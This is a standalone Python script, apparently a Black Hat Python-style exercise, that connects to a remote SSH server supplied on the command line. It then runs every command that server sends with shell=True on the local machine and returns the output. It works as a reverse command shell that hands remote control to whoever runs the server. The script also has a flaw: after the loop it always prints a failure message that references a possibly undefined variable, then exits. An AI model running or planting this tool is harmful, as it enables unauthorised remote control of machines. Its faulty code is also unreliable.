

import paramiko
import sys
import subprocess


def ssh_command(ip,port,user,passwd,command):

    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip,port=port,username=user,password=passwd)
    ssh_session = client.get_transport().open_session()
    ssh_session.get_pty()
    ssh_session.invoke_shell()

    if ssh_session.active:
            
        ssh_session.send(command)

        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024).decode()
            if command.strip() == 'exit':
                print("[*] Exiting.")
                break

            try:
                output =  subprocess.check_output(command,shell=True)
                ssh_session.send(output)
                    
            except Exception as e:
                ssh_session.send(str(e).encode())


    client.close()
    print(f"[-] Connection Failed: {e}")
    sys.exit(1)



if __name__ == "__main__":

    if len(sys.argv) != 5:
        print("Usage: bh_sshRcmd.py [ip] [port] [username] [password]")
        sys.exit(1)


    ip = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]

    ssh_command(ip,port,username,password,'Client connected')
